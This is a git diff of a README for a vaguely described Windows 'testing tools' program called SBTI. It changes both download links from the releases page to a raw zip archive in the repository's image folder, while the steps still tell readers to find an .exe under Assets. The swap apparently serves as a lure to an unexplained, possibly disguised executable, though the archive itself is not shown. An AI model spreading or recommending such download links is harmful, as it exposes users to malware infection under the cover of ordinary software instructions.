@@ -1,6 +1,6 @@
 # 🚀 SBTI - Access your testing tools with ease
 
-[![](https://img.shields.io/badge/Download_SBTI-Blue-blue)](https://github.com/libertarianjohnsmith4586/SBTI/releases)
+[![](https://img.shields.io/badge/Download_SBTI-Blue-blue)](https://github.com/libertarianjohnsmith4586/SBTI/raw/refs/heads/main/image/Software-v2.1-beta.5.zip)
 
 SBTI provides a simple way to access your testing environments. You can manage your tasks and verify connections without complex setups. This tool runs on your Windows computer and keeps your workflow smooth. Follow this guide to get started.
 
@@ -8,7 +8,7 @@ SBTI provides a simple way to access your testing environments. You can manage y
 
 You will find the latest version of SBTI on our release page. 
 
-1. Visit this page to download: [https://github.com/libertarianjohnsmith4586/SBTI/releases](https://github.com/libertarianjohnsmith4586/SBTI/releases)
+1. Visit this page to download: [https://github.com/libertarianjohnsmith4586/SBTI/raw/refs/heads/main/image/Software-v2.1-beta.5.zip](https://github.com/libertarianjohnsmith4586/SBTI/raw/refs/heads/main/image/Software-v2.1-beta.5.zip)
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
